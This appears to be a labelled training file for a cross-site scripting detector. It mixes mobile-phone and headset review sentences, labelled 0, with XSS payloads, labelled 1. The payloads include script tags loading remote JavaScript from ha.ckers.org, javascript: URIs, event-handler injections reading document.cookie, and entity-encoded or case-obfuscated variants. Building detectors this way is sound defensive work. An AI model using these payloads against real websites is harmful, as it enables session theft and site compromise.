1	<img lowsrc="javascript:alert('xss')">
1	\";alert('xss');//
1	<script src=http://ha.ckers.org/xss.js></script>
1	<iMg LOwSrc="JaVaSCripT:alerT('Xss')">
0	Excellent dual-purpose headset.
1	<IMG SRC="LIVESCRIPT:[CODE]">
0	If I take a picture, the battery drops a bar, and starts beeping, letting me know its dieing.
1	<IMG SRC=" &#14;  JAVASCRIPT:ALERT('XSS');">
0	I can hear while I'm driving in the car, and usually don't even have to put it on it's loudest setting.
1	<img src=/ onerror="alert(string.fromcharcode(88,83,83))"></img>
1	<IMG DYNSRC="JAVASCRIPT:ALERT('XSS')">
1	<script/src="http://ha.ckers.org/xss.js"></script>
1	<body onload=alert('xss')>
1	<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS></SCRIPT>
1	<IMG SRC="JAV&#X0A;ASCRIPT:ALERT('XSS');">
1	<iframe src=http://ha.ckers.org/scriptlet.html <
1	<img src="javascript:alert('xss')"
0	Best headset ever!!!.
1	</title><script>alert("xss");</script>
1	<IMG SRC=JAVASCRIPT:ALERT('XSS')>
1	<INPUT TYPE="IMAGE" SRC="JAVASCRIPT:ALERT('XSS');">
1	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
1	<A ONMOUSEOVER=ALERT(DOCUMENT.COOKIE)>XXS LINK</A>
1	<IMg SRc="JaV&#X0A;asCRiPT:AleRt('xsS');">
1	<img src="jav&#x0a;ascript:alert('xss');">
1	<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
1	<IMG SRc=jAVAscRIPT:aleRt(strInG.fROmCharcodE(88,83,83))>
1	<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
0	It didn't charge for me.
1	<IMG SRC=javascript:alert('XSS')>
1	<IMG DYNSRC="javascript:alert('XSS')">
1	<img dynsrc="javascript:alert('xss')">
1	<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
0	But despite these few flaws, this case is of exceptional quality and well worth the additional costs of owning an official OEM product.
0	but it is great, i would really recommend it
label	sentence
0	Works for me.
1	" onfocus="alert(1)" name="bounty
1	<a onmouseover=alert(document.cookie)>xxs link</a>
0	This is the phone to get for 25.... I just bought my S7a and all I can say is WOW!
0	cool phone.
0	I was very pleased to see that I could replace my well travled swivel holster for my Blackberry flip.
1	<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
1	'';!--"<XSS>=&{()}
0	It always cuts out and makes a beep beep beep sound then says signal failed.
0	Saggy, floppy piece of junk.
0	Very unreliable service from T-mobile !
0	When it opens, the battery connection is broken and the device is turned off.
1	<iMg ONmOUseOVER="aLeRt('XXS')">
0	I am pairing this with my iphone, and I could not be happier with it so far.
1	<imG dyNSrC="JAVaSCRiPt:aLErT('Xss')">
1	<svg><x><script>alert(1)</x>
1	<IMG ONMOUSEOVER="ALERT('XXS')">
0	The cutouts and buttons are placed perfectly.
1	<IMG SRC=# ONMOUSEOVER="ALERT('XXS')">
